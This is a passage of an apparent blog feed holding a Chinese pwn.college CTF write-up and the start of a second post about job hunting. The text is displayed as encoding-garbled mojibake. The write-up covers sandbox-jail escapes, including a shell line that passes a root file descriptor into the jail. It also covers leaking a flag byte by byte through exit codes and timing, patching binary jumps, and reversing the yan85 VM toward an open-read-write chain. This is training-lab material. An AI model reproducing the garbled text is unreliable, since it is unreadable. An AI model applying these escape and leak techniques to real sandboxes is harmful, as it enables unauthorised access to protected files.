ä¸€ä¸ªCè¯­è¨€å†™çš„å°è£…å™¨å»æ‰§è¡Œç¨‹åºï¼Œè¿™æ ·forkå°±èƒ½å¸¦ä¸Šçˆ¶è¿›ç¨‹çš„fdã€‚çœ‹äº†æŸä¸ªå…¶ä»–äººçš„åšæ³•ï¼Œæœ‰ç‚¹å‰å®³ï¼Œç›´æ¥åœ¨shellä¸­ä¼ æ–‡ä»¶æè¿°ç¬¦ã€‚<code>/challenge/babyjail_level8 0 &lt; shellcode-raw 3&lt;/</code></p><p>level9ï¼šè¿™é“é¢˜æ²¡æœ‰é™åˆ¶åœ¨æŸä¸ªç›®å½•ï¼Œè€Œé™åˆ¶äº†syscallåªèƒ½ä¸º<code>close</code>ã€<code>stat</code>ã€<code>fstat</code>ã€<code>lstat</code>ã€‚ä¸€å¼€å§‹å¯¹é‚£ä¸ª32ä½çš„é™åˆ¶æ‘¸ä¸ç€å¤´è„‘ï¼ŒåŸæ¥æ˜¯32ä½çš„ç³»ç»Ÿè°ƒç”¨å¯ä»¥æ‰§è¡Œçš„æ„æ€ã€‚ã€‚ã€‚åªèƒ½æ‰§è¡Œ32ä½çš„ç³»ç»Ÿè°ƒç”¨é€ æˆä¸€äº›éº»çƒ¦ï¼Œæ¯”å¦‚æˆ‘åœ¨ç”¨rspå½“åšå­—ç¬¦ä¸²åœ°å€ä¼ å‚æ•°æ—¶åœ°å€ä¼šè¶…è¿‡4å­—èŠ‚ï¼Œå¯¼è‡´æœ€åç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶å¤±è´¥ã€‚è¿™é‡Œå­¦åˆ°çš„å°æŠ€å·§æ˜¯ç”¨æ±‡ç¼–çš„æ ‡è®°ï¼Œé…åˆ<code>lea</code>æŒ‡ä»¤å»è·å¾—å­—ç¬¦ä¸²åœ°å€ã€‚</p><p>level10ï¼šè¿™é“é¢˜åªæœ‰readå’Œexitä¸¤ä¸ªsyscallå¯ä»¥ç”¨ã€‚ä¼¼ä¹åªèƒ½readæ•°æ®åˆ°å›ºå®šåœ°å€ä¸Šï¼Œç„¶åcmpå»é€ä¸€æ¯”è¾ƒï¼Œä½†åæ¥æƒ³åˆ°exitæ˜¯èƒ½å¤–å¸¦æ•°æ®çš„ï¼ŒæŠŠè¯»å…¥çš„å†…å®¹å½“åšé€€å‡ºçš„è¿”å›å€¼å°±èƒ½é€å­—èŠ‚æ³„éœ²flagã€‚(å‘ç°ä¸€ç‚¹ç¥å¥‡çš„åœ°æ–¹åœ¨äºexitåªä¼šè¯»å¯„å­˜å™¨çš„æœ€ä½å­—èŠ‚çš„å†…å®¹ï¼Œæ‰€ä»¥ç›´æ¥å‘rdiä¼ æ•°æ®ä¹Ÿåªè¯»å–æœ€ä½ä¸€å­—èŠ‚ä¸ºè¿”å›å€¼)</p><p>level11ï¼šè¿™é“é¢˜åªæœ‰readå’Œnanotimeå¯ä»¥ç”¨ï¼Œçœ‹æ¥è¿™æ¬¡æ˜¯è¦ä½¿ç”¨å»¶æ—¶çš„æ–¹æ³•çˆ†ç ´flagå†…å®¹äº†ã€‚nanotimeè°ƒç”¨çš„å‚æ•°å¿…é¡»è¦æ˜¯æŒ‡é’ˆï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚æ¯”è¾ƒæ ¸å¿ƒçš„æ±‡ç¼–æ˜¯ä¸€æ®µæ¯”è¾ƒæ•°æ®çš„æ“ä½œã€‚</p><p>level12ï¼šè¿™é“é¢˜è¿›ä¸€æ­¥å¯¹syscallåšäº†é™åˆ¶ï¼Œåªèƒ½ä½¿ç”¨readã€‚é‚£ä¹ˆçœ‹æ¥è¦åšäºŒåˆ†åˆ¤æ–­å¿…é¡»å…¨éƒ¨é‡‡ç”¨æ±‡ç¼–çš„æ“ä½œå®ç°ã€‚è¿™é‡Œæœ‰ä¸¤ç§æ€è·¯ï¼Œå…¶ä¸€æ˜¯åˆ©ç”¨æ±‡ç¼–æ‰§è¡Œå¤æ‚çš„ä»»åŠ¡é€ æˆæ‰§è¡Œå»¶æ—¶ï¼Œå…¶äºŒæ˜¯é€ æˆæ­»å¾ªç¯æ¥å»¶æ—¶ã€‚å¤æ‚ä»»åŠ¡æš‚æ—¶ä¸çŸ¥é“è¯¥å¦‚ä½•å†™æ±‡ç¼–ã€‚ã€‚å› æ­¤è¿™é‡Œç›´æ¥å†™æˆæ­»å¾ªç¯å»åˆ¤æ–­ã€‚å…¶ä¸­å¦‚æœè§¦å‘äº†æ­»å¾ªç¯ï¼Œå¯ä»¥é€šè¿‡é™åˆ¶recvçš„timeoutæ¥è¾…åŠ©åˆ¤æ–­ï¼Œå¦‚æœæ˜¯å¾ªç¯ä¸­è‚¯å®šä¼šå› ä¸ºtimeouté™åˆ¶è¶…æ—¶ï¼Œå› æ­¤è®¡ç®—æ—¶é—´é—´éš”å¯ä»¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¶…æ—¶ç°è±¡ï¼Œå­˜åœ¨çš„è¯å°±ä»£è¡¨æˆåŠŸè§¦å‘ã€‚</p><p>level13ï¼šè¿™é¢˜åœ¨forkå‡ºå­è¿›ç¨‹ä¸­æ‰§è¡Œshellcodeï¼Œä¸”åªæœ‰readã€writeã€exitå¯ä»¥ä½¿ç”¨ã€‚åˆšå¼€å§‹ä¸€å¤´é›¾æ°´ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ„æ€ï¼Œåœ¨é˜…è¯»å®Œæºä»£ç ä¹‹åå‘ç°æ˜¯éœ€è¦æ§åˆ¶å­è¿›ç¨‹å‘é€æŒ‡ä»¤çˆ¶è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹è§£ææŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œè€Œè¿™ä¸ªäº¤äº’çš„è¿‡ç¨‹æ˜¯é€šè¿‡socketå®Œæˆã€‚è¿™é“é¢˜å»¶ä¼¸å‡ºäº†ä¸¤ç§è§£é¢˜æ€è·¯ï¼Œç¬¬ä¸€ç§æ˜¯åˆ©ç”¨å®ƒä¼šæç¤ºé”™è¯¯çš„è¾“å…¥æ•°æ®ï¼Œæ¯9å­—èŠ‚æ³„éœ²flagã€‚ç¬¬äºŒç§æ€è·¯æ˜¯æ‰‹åŠ¨åœ¨è¯»å–åˆ°çš„flagæ•°æ®å‰å†™å…¥<code>print_msg</code>çš„å­—ç¬¦ï¼Œç„¶åæ•´ä¸ªå­—ç¬¦ä¸²å°±ä¼šæˆä¸ºä¸€æ¡åˆæ³•æŒ‡ä»¤ï¼Œç›´æ¥è¾“å‡ºflagå†…å®¹ã€‚</p><h2 id="module6-è°ƒè¯•å™¨æ¨¡å—"><a href="#module6-è°ƒè¯•å™¨æ¨¡å—" class="headerlink" title="module6 è°ƒè¯•å™¨æ¨¡å—"></a>module6 è°ƒè¯•å™¨æ¨¡å—</h2><p>æ²¡å•¥å¥½è¯´çš„ç›´æ¥å°±æ˜¯å­¦ä¹ gdbçš„ä¸€äº›æ“ä½œã€‚</p><p>level1ï¼šå­¦ä¹ runï¼Œstartï¼Œcontinue</p><p>level2ï¼šå­¦ä¼šæŸ¥çœ‹å¯„å­˜å™¨çš„å€¼</p><p>level3ï¼šå­¦åˆ°äº†<code>set disassembly-flavor intel</code>å¯ä»¥è®¾ç½®æˆintelçš„æ ¼å¼ã€‚ç„¶åæŸ¥çœ‹æ ˆä¸Šçš„æ•°æ®ã€‚</p><p>level4-5ï¼šlevel4å­¦åˆ°äº†displayæŒ‡ä»¤ï¼Œå¯ä»¥åœ¨æ‰§è¡Œå®Œä¸€æ¡è¯­å¥ä¹‹åæ˜¾ç¤ºå†…å®¹ã€‚æ¯”å¦‚<code>display/8i $rip</code>ï¼Œå¯ä»¥åœ¨æ¯æ¬¡æ‰§è¡Œä¹‹åæ‰“å°8æ¡æŒ‡ä»¤ã€‚ç„¶ååœ¨è¯»è¾“å…¥çš„ä½ç½®ä¸‹æ–­ç‚¹ï¼Œè§‚å¯Ÿæ ˆåœ°å€ä¸Šå˜åŒ–çš„å€¼ï¼Œå…¶å®å¾ˆå®¹æ˜“å°±èƒ½çœ‹åˆ°åœ¨rbp-0x18çš„ä½ç½®å¤„å†™å…¥éšæœºå€¼ï¼Œç„¶åä¸Šé¢è¿˜ä¼šæœ‰ä¸Šä¸€æ¬¡çš„éšæœºæ•°å­˜åœ¨ã€‚level5ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä½†æ˜¯é¢˜ç›®è¦æ±‚ç”¨è„šæœ¬å»æ‰§è¡Œï¼Œæˆ‘è¿™é‡Œå·æ‡’äº†ï¼Œç›´æ¥æ‰‹åŠ¨ç”¨åŒæ ·çš„æ–¹æ³•å¾—åˆ°flagã€‚</p><p>level6ï¼šå­¦åˆ°äº†setä¿®æ”¹åŠ¨æ€è°ƒè¯•ä¸­çš„æ•°æ®ã€‚è¿™é‡Œæ˜¯ç›´æ¥æŠŠå­˜å‚¨çš„ä¸´æ—¶å˜é‡æ”¹æˆæ›´å¤§çš„æ•°å­—ï¼Œè¿™æ ·ä¸ç”¨åšé‚£ä¹ˆå¤šæ¬¡è¾“å…¥ç›´æ¥è¿›å…¥winã€‚<code>set {int}($rbp-0x1c)=0x3f</code></p><p>level7ï¼šè¿™é¢˜ç›´æ¥ç‹ç‚¸ï¼ç»™äº†ä¸€ä¸ªæ–¹æ³•callï¼Œèƒ½å¤Ÿç›´æ¥è°ƒç”¨winå‡½æ•°æ‹¿åˆ°flagã€‚<code>call (void)win()</code></p><h2 id="module7-é€†å‘å·¥ç¨‹æ¨¡å—"><a href="#module7-é€†å‘å·¥ç¨‹æ¨¡å—" class="headerlink" title="module7 é€†å‘å·¥ç¨‹æ¨¡å—"></a>module7 é€†å‘å·¥ç¨‹æ¨¡å—</h2><p>å‰é¢å‡ é“é¢˜åŸºæœ¬ä¸Šæ˜¯è°ƒæ•´è¾“å…¥æ•°æ®çš„é¡ºåºï¼Œæ¯”å¦‚è°ƒæ•´ä½ç½®ï¼Œä½ç½®é€†å‘ï¼Œæ’åºç­‰ç­‰ã€‚ç›´æ¥ç”¨gdbæˆ–è€…stringså»åŠ¨é™æ€ç»“åˆè°ƒè¯•å°±èƒ½è¿‡ï¼Œè¿IDAéƒ½ç”¨ä¸ä¸Šã€‚</p><p>éšåå¼€å§‹å¯¹è¾“å…¥åšå¼‚æˆ–ï¼Œå¤šè½®çš„ç®—æ³•æ“ä½œï¼ˆå¼‚æˆ–ã€æ’åºã€é€†å‘ï¼‰ï¼Œæ’åºå®Œå…¨æ²¡æœ‰åµç”¨ï¼Œå¯èƒ½è¿™å°±æ˜¯è¯•æ¢ä½ æ˜¯ä¸æ˜¯çœŸçš„å»æ€è€ƒäº†ã€‚</p><p>ä¹‹åçš„é¢˜è¶Šæ¥è¶Šéš¾ï¼Œå¯ä»¥é€šè¿‡scpæŠŠé¢˜ç›®ä¸‹è½½ä¸‹æ¥ï¼Œç”¨IDAç­‰ç°ä»£å·¥å…·å»åšé€†å‘åˆ†æã€‚</p><p>level7.1ï¼šéœ€è¦æ³¨æ„ä¸€ä¸‹switchè·³è½¬è¡¨çš„é€†å‘ï¼Œæœ‰ä¸€ä¸ªé•¿åº¦ä¸º5çš„xorè½®è½¬keyã€‚åœ¨æŸ¥äº†èµ„æ–™ä¹‹åå‘ç°switchè¶…è¿‡4äº†ä¹‹åä¼šè¢«ä¼˜åŒ–ä¸ºè·³è½¬è¡¨çš„å½¢å¼ï¼Œè¿™æ ·éœ€è¦ç”¨åˆ°idaé‡Œé¢çš„switchè¯†åˆ«çš„åŠŸèƒ½ï¼Œåœ¨edit-&gt;other-&gt;specify switch idiomã€‚</p><p>level9ï¼šå‡ºç°å¯¹è¾“å…¥æ•°æ®åšmd5çš„æ“ä½œï¼Œä½†è¿™ä¸ªæ“ä½œæ˜¯ä¸å¯é€†çš„ï¼Œé‚£ä¹ˆè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿé¢˜ç›®ä¸€å¼€å§‹ç»™äº†5ä¸ªæ¬¡æœºä¼šå¯ä»¥ä¿®æ”¹åœ°å€ä¸Šçš„æ•°æ®ï¼Œä»”ç»†é€†å‘èƒ½çŸ¥é“è¿™ä¸ªåœ°å€æ˜¯ç¨‹åºçš„åŸºåœ°å€ï¼Œå› æ­¤å¯ä»¥å½“åšä¸€ç§åŠ¨æ€patchï¼Œå¹¶ä¸”è¿˜æŠŠæ•´ä¸ªç¨‹åºæ‰€åœ¨çš„é¡µè®¾ç½®æˆäº†rwxã€‚æˆ‘ä»¬å°±èƒ½ç›´æ¥patchè·³è½¬æŒ‡ä»¤ï¼Œç›´æ¥è¿›è¯»flagçš„é€»è¾‘ã€‚æŒ‡ä»¤å¯ä»¥é€šè¿‡pwntoolsç›´æ¥ç”Ÿæˆï¼Œä¹Ÿå¯ä»¥æŸ¥æŒ‡ä»¤æ‰‹å†Œï¼Œæˆ–è€…ç”¨keypatchã€‚</p><p>level11ï¼šå¢åŠ äº†å¯¹ä»£ç å®Œæ•´æ€§çš„æ£€æŸ¥ï¼Œç„¶è€Œè¿™ä¸ªæ£€æŸ¥å¾ˆå¼±ï¼Œå› ä¸ºæ£€æŸ¥æœ¬èº«å¯¹è‡ªå·±å¹¶æ²¡æœ‰ä¿æŠ¤ï¼Œæ‰€ä»¥èƒ½å¤Ÿç›´æ¥ç ´åæ£€æŸ¥ä¹‹åï¼Œå†è¿›è¡ŒåŸæœ‰çš„patchæ“ä½œã€‚åœ¨ç¬¬äºŒä¸ªé¢˜ç›®éœ€è¦æ³¨æ„æ¡ä»¶è·³è½¬çš„ä¸åŒç±»å‹ï¼Œé•¿è·³è½¬å’ŒçŸ­è·³è½¬æœ‰ä¸åŒçš„æ“ä½œç ï¼Œåœ¨patchçš„æ—¶å€™éœ€è¦æ³¨æ„ã€‚</p><p>level12ï¼šå¼€å§‹äº†yan85è™šæ‹Ÿæœºçš„é€†å‘è¿‡ç¨‹ã€‚æ¯”è¾ƒå‘çš„ä¸€ç‚¹æ˜¯æˆ‘åˆšå¼€å§‹æ²¡å‘ç°ç¨‹åºä¸­æœ‰memcmpå‡½æ•°ï¼ŒåŸæ¥è¿˜æ˜¯æœ‰è¾“å…¥å¯¹æ¯”ï¼Œåªä¸è¿‡å…³é”®çš„æ•°æ®è¢«è™šæ‹ŸåŒ–ä¿æŠ¤äº†ã€‚ä¸‹é¢æ˜¯é€†å‘å‡ºçš„å‡ ä¸ªæŒ‡ä»¤ï¼Œé€šè¿‡è§£è¯»å‰é¢çš„å‡ ä¸ªæŒ‡ä»¤ï¼Œå¯ä»¥çŸ¥é“æ˜¯å‘0x65åç§»çš„åœ°æ–¹å†™å…¥æˆ‘ä»¬çš„è¾“å…¥æ•°æ®ï¼Œç„¶åä¸0x85åç§»çš„å†…å®¹ä½œæ¯”è¾ƒï¼Œ0x85çš„å†…å®¹å¯ä»¥ä»æŒ‡ä»¤ä¸­çœ‹å‡ºæ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMM æ˜¯å®šä¹‰ç«‹å³æ•°</span><br><span class="line">STM æ˜¯åœ¨ç›¸å¯¹åç§»ä¸­å†™å…¥æ•°æ®</span><br><span class="line">ADD æ˜¯åœ¨é¦–ä½ç«‹å³æ•°ä¸Šé¢åŠ ç¬¬äºŒä½ç«‹å³æ•°</span><br><span class="line">SYS ç³»ç»Ÿè°ƒç”¨ æ ¹æ®ç¬¬ä¸€ä¸ªå¸¸é‡è°ƒç”¨ä¸åŒçš„syscall ç¬¬äºŒå‚æ•°æ˜¯ä¿å­˜è¿”å›ç»“æœçš„å¯„å­˜å™¨</span><br></pre></td></tr></table></figure><p>level13ï¼šå¤šäº†ä¸¤ä¸ªæŒ‡ä»¤CMPå’ŒLDMã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMP æ˜¯æ¯”è¾ƒç¬¬ä¸€ä¸ªå‚æ•°å’Œç¬¬äºŒä¸ªå‚æ•°çš„å¤§å°</span><br><span class="line">LDM æ˜¯åœ¨ç›¸å¯¹åç§»ä¸­è¯»æ•°æ®</span><br></pre></td></tr></table></figure><p>level14-15ï¼šå¤šäº†ä¸€äº›å¯¹å†…å­˜ä¸­æ•°æ®çš„å˜æ¢æ“ä½œï¼Œæ¯”å¦‚å†™å…¥å†…å­˜çš„æ•°æ®å†å–å‡ºæ¥åŠ ä¸Šä¸€ä¸ªæ•°ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç±»å‹éƒ½æ˜¯charï¼Œæ‰€ä»¥æ•°æ®éƒ½æ˜¯å•å­—èŠ‚å¤§å°ï¼Œè¶…è¿‡256ä¸ä¼šä¿ç•™é«˜ä½ã€‚level15é›·åŒçš„é¢˜ç›®ï¼Œä¸è¿‡è¿™é‡Œåœ¨æ¯”è¾ƒä¸Šæ›´åŠ ç®€æ´ï¼Œç›´æ¥é‡‡ç”¨å¯„å­˜å™¨åšæ¯”è¾ƒã€‚</p><p>level16ï¼šä»è¿™é‡Œå¼€å§‹å°±æ˜¯å®Œæ•´çš„Yan85è™šæ‹Ÿæœºã€‚åˆå¤šäº†STKå’ŒJMPæŒ‡ä»¤ï¼Œå¹¶ä¸”æ•´ä¸ªç¨‹åºæ˜¯é‡‡ç”¨vmcodeè§£é‡Šæ‰§è¡Œï¼Œå·²ç»æ˜¯ä¸€é“å®Œæ•´çš„è™šæ‹Ÿæœºé¢˜ç›®äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STK æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°popï¼Œç¬¬äºŒä¸ªå‚æ•°push</span><br><span class="line">JMP æ˜¯è·³è½¬æŒ‡ä»¤ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¡ä»¶ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡ä»¤ä½ç½®</span><br></pre></td></tr></table></figure><p>æœ€åé€†å‘å‡ºæ¥çš„ç»“æœæ˜¯å¾ªç¯CMPæ¯”è¾ƒï¼Œé€šè¿‡JMPæ‰§è¡Œè·³è½¬ã€‚é‡Œé¢è¿˜æœ‰STKè¿›è¡Œæ ˆç©ºé—´åˆ©ç”¨ã€‚<br>è¿™é“é¢˜æœ€åæ˜¯åˆ©ç”¨åŠ¨æ€è°ƒè¯•çš„æ–¹å¼åšå‡ºæ¥çš„ï¼Œå—åˆ°sakuraçš„æç¤ºï¼Œç”¨gdbåŠ¨æ€å®šä½åˆ°cmpçš„åœ°æ–¹ï¼Œè·å–å¾…æ¯”è¾ƒçš„æ•°æ®ï¼Œè¿™æ ·å¯ä»¥é€å­—èŠ‚çš„è·å¾—keyçš„å€¼ï¼Œå¹¶ä¸”å­¦åˆ°äº†gdbè„šæœ¬çš„ä¸€äº›æ“ä½œã€‚</p><p>level17ï¼šåœ¨level16çš„åŸºç¡€ä¸Šå¯¹å†™å…¥çš„æ•°æ®åšäº†addï¼Œå› æ­¤éœ€è¦æŠŠaddçš„æ•°æ®ä¹Ÿè¦è·å–åˆ°ã€‚</p><p>level18ï¼šéœ€è¦ä½ è¾“å…¥è™šæ‹Ÿæœºçš„opcodeï¼Œå®ƒä¼šæ‰§è¡Œä½ çš„è™šæ‹ŸæœºæŒ‡ä»¤ã€‚è¿™æ ·çš„è¯å°±éœ€è¦å†™opcodeç¼–ç å™¨äº†ã€‚ç„¶ååˆ©ç”¨openï¼Œç›´æ¥è¾“å‡ºflagã€‚ORWçš„ç»å…¸æ€è·¯ï¼Œä¸»è¦çš„é—®é¢˜æ˜¯éœ€è¦å†™ä¸€ä¸ªç¼–ç å™¨ï¼Œè¿™ä¸ªè™šæ‹ŸæœºæŒ‡ä»¤æ˜¯3å­—èŠ‚ä¸ºå•ä½ï¼Œç¬¬ä¸€å­—èŠ‚opcodeï¼Œç¬¬äºŒç¬¬ä¸‰å­—èŠ‚æ˜¯å‚æ•°ã€‚æœ‰ä¸€ç‚¹å¾ˆçƒ¦çš„æ˜¯level18.0çš„è™šæ‹ŸæœºæŒ‡ä»¤å’Œlevel18.1çš„è™šæ‹ŸæœºæŒ‡ä»¤ç»“æ„ä¸Šæœ‰ä¸åŒï¼Œä¸€ä¸ªopcodeåœ¨ç¬¬ä¸€ä½ï¼Œå¦å¤–ä¸€ä¸ªåœ¨ç¬¬äºŒä½ï¼Œå¹¶ä¸”æ“ä½œç ä¹Ÿæœ‰æ‰€ä¸åŒï¼Œè¿™ä¸¤ç‚¹æ˜¯éœ€è¦æ³¨æ„çš„ã€‚</p><p>level19ï¼šä¼šå¯¹æ‰€æœ‰çš„å¯„å­˜å™¨ï¼Œæ“ä½œç ï¼Œç³»ç»Ÿè°ƒç”¨ç åšéšæœºåŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡æ‰§è¡Œä¸€äº›æŒ‡ä»¤æ¥é€æ¸åˆ¤æ–­ã€‚åœ¨è¿›ä¸€æ­¥é€†å‘ç¨‹åºï¼Œå‘ç°å®ƒçš„éšæœºç§å­æ˜¯å’Œflagç›¸å…³çš„ï¼Œè€Œflagæ˜¯å›ºå®šçš„å€¼ï¼Œå› æ­¤å®ƒæ¯æ¬¡éšæœºçš„ç»“æœæ˜¯å›ºå®šçš„ï¼Œè¿™æ ·çš„è¯é€ä¸ªçŒœè§£å°±èƒ½å®Œæˆæœ€åçš„orwã€‚</p><ol><li><p>å¯¹äºç¬¬ä¸€é¢˜å› ä¸ºæœ‰ç¼–ç æç¤ºï¼Œæ‰€ä»¥ç›´æ¥ä¸€æ¡ä¸€æ¡æŒ‡ä»¤çš„å°è¯•ï¼Œè§‚å¯Ÿå®ƒçš„ç¼–ç è¾“å‡ºç»“æœå°±èƒ½æ¨æµ‹å‡ºæŒ‡ä»¤çš„opcodeã€‚ç¬¬äºŒé¢˜æ²¡æœ‰äº†æç¤ºï¼Œå°±åªèƒ½è§‚å¯Ÿç¨‹åºçš„è¡Œä¸ºäº†ã€‚éœ€è¦ç¡®å®šIMMã€STKã€SYSï¼Œè‡³å°‘ä¸‰æ¡æŒ‡ä»¤ã€‚ä»¥åŠå‚æ•°å¯„å­˜å™¨aã€bã€cã€‚</p></li><li><p>IMMå¯ä»¥é€šè¿‡ç¬¬äºŒä¸ªå‚æ•°æŠ¥é”™çš„æ–¹æ³•ç¡®å®šï¼Œå› ä¸ºç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æ˜¯ä»»æ„ä¸€å­—èŠ‚çš„æ•°æ®ã€‚STKå¯ä»¥é€šè¿‡STK NONE NONEçš„æŒ‡ä»¤å»æµ‹è¯•ã€‚SYSå¯ä»¥é€šè¿‡æ‰¾æœªçŸ¥å¯„å­˜å™¨æ¥ç¡®å®šï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æŠ¥äº†æœªçŸ¥å¯„å­˜å™¨çš„é”™è¯¯ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡å°±ä¸æ˜¯SYSæŒ‡ä»¤ã€‚</p></li><li><p>SYSçš„è°ƒç”¨å·ç¡®å®šæ–¹æ³•ï¼Œexitèƒ½è§‚å¯Ÿåˆ°ç›´æ¥é€€å‡ºï¼›åœ¨sleepåè·Ÿç€exitèƒ½è§‚å¯Ÿåˆ°ç¨‹åºå»¶è¿Ÿï¼›openèƒ½è§‚å¯Ÿè°ƒç”¨è¿”å›å€¼ç¡®å®šï¼Œæˆ‘ä»¬å»æ‰“å¼€/flagæ–‡ä»¶ï¼Œè§‚å¯Ÿè¿”å›å€¼æ˜¯å¦ä¸º4ï¼›readå¯ä»¥å°†aè®¾ç½®ä¸º0å’Œ4åè§‚å¯Ÿç¨‹åºè¡Œä¸ºçš„ä¸åŒï¼Œç¬¬ä¸€å‚æ•°ä¸º0å…¶ä»–åŒæ ·ä¸º0çš„è¯ä¼šç›´æ¥è¿”å›0ï¼Œå¦‚æœç¬¬ä¸€å‚æ•°ä¸º4åˆ™ä¼šæŠ¥é”™è¿”å›-1ï¼›writeåˆ™æ˜¯ç¬¬ä¸€å‚æ•°ä¸º0å’Œ1æ—¶ç¨‹åºè¿”å›æœ‰æ‰€ä¸åŒã€‚è¦åŒºåˆ†æ˜¯readåˆ°ä»£ç æ®µè¿˜æ˜¯å†…å­˜æ®µï¼Œå¯ä»¥é…åˆwriteåˆ¤æ–­ï¼Œå¦‚æœreadçš„æ•°æ®ä¿®æ”¹äº†å†…å­˜ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆå°±æ˜¯readåˆ°å†…å­˜çš„è°ƒç”¨ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p></li><li><p>å¯¹äºaå‚æ•°ï¼Œå¯ä»¥é€šè¿‡exitçš„è¿”å›å€¼æ¥ç¡®å®šï¼›å¯¹äºcå‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨writeè¾“å‡ºæ•°æ®ï¼Œå¦‚æœèƒ½æˆåŠŸè¾“å‡ºå†…å®¹ï¼Œä»£è¡¨å°±æ˜¯cï¼›å¯¹äºbå‚æ•°ï¼ŒåŒæ ·ä½¿ç”¨writeï¼Œå¦‚æœè¾“å‡ºçš„æ•°æ®äº§ç”Ÿäº†åç§»ï¼Œé‚£ä¹ˆå°±æ˜¯bã€‚</p></li></ol><p>è‡³æ­¤ï¼Œæˆ‘ä»¬æ¨æµ‹å‡ºäº†æ‰€æœ‰è¦ä½¿ç”¨çš„å†…å®¹ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/2022/05/26/pwn-college-writeup-one/1.png&quot;&gt;
&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¹‹å‰ä¸€æ®µæ—¶é—´æ‰¾åˆ°äº†&lt;code&gt;p
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€ä¸ªåŒéå®‰å…¨èœé¸¡çš„ç§‹æ‹›æ€»ç»“</title>
    <link href="https://hurricane618.me/2021/12/08/2021-autunm-recruitment-summary/"/>
    <id>https://hurricane618.me/2021/12/08/2021-autunm-recruitment-summary/</id>
    <published>2021-12-08T01:58:15.000Z</published>
    <updated>2022-04-25T14:07:31.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¸ˆå…„ä»¬æ›¾åœ¨ç‰›å®¢ä¸Šæ€»ç»“äº†è‡ªå·±çš„ç§‹æ‹›ï¼Œåœ¨åå¤é˜…è¯»çš„è¿‡ç¨‹ä¸­æ·±å—é¼“èˆï¼Œæ‰€ä»¥åœ¨æˆ‘çš„ç§‹æ‹›åŸºæœ¬å‘Šä¸€æ®µè½ä¹‹åä¹Ÿæ˜¯é€‰æ‹©è®°å½•ä¸‹æ¥ï¼Œä¸ºç¤¾åŒºè´¡çŒ®ä¸€ç‚¹å¾®è–„ä¹‹åŠ›ã€‚</p><p>åŒæ—¶ï¼Œç½‘ä¸Šçš„å®‰å…¨ç›¸å…³é¢ç»ç‰¹åˆ«ç¨€å°‘ï¼Œæƒ³è¦æ‰¾äººäº¤æµåˆæ— ä»ä¸‹æ‰‹ï¼Œå¾ˆå¤šæ—¶å€™åªèƒ½ä¾é å¸ˆå…„å¸ˆå§å­¦é•¿å­¦å§ä»¬æä¾›çš„ä¿¡æ¯ã€‚å¸Œæœ›å€Ÿæ­¤æœºä¼šä¸å®‰å…¨åœˆçš„å¸ˆå‚…ä»¬ä¸€èµ·æ„‰å¿«äº¤æµã€‚</p><h2 id="æ±‚å­¦ç»å†"><a href="#æ±‚å­¦ç»å†" class="headerlink" title="æ±‚å­¦ç»å†"></a>æ±‚å­¦ç»å†</h2><p>å›é¡¾è¿™ä¸€æ®µç»å†ï¼Œæƒ³èµ·ä¸€å¥è¯ï¼šä¸Šå¸ä¸ºä½ å…³ä¸Šä¸€æ‰‡é—¨çš„åŒæ—¶ï¼Œä¹Ÿä¼šä¸ºä½ æ‰“å¼€ä¸€æ‰‡çª—ã€‚</p><p>æ—©åœ¨å¤§ä¸‰çš„æ—¶å€™å°±å¯¹è¿™é‡Œæœ‰æ‰€äº†è§£ï¼Œä¸è¿‡å½“æ—¶æ˜¯åœ¨å¦å¤–ä¸€ä¸ªå®éªŒå®¤ä¸­ï¼Œæœ€åˆçš„æ„Ÿå—æ˜¯è¿™é‡Œç¯å¢ƒçš„é«˜å¤§ä¸Šï¼Œæœ‰å‰å®³çš„å­¦é•¿å’Œç•…èŠæŠ€æœ¯çš„è‰¯å¥½æ°›å›´ã€‚ç„¶è€Œä¸–äº‹éš¾æ–™ï¼Œå½“æ—¶è€ƒç 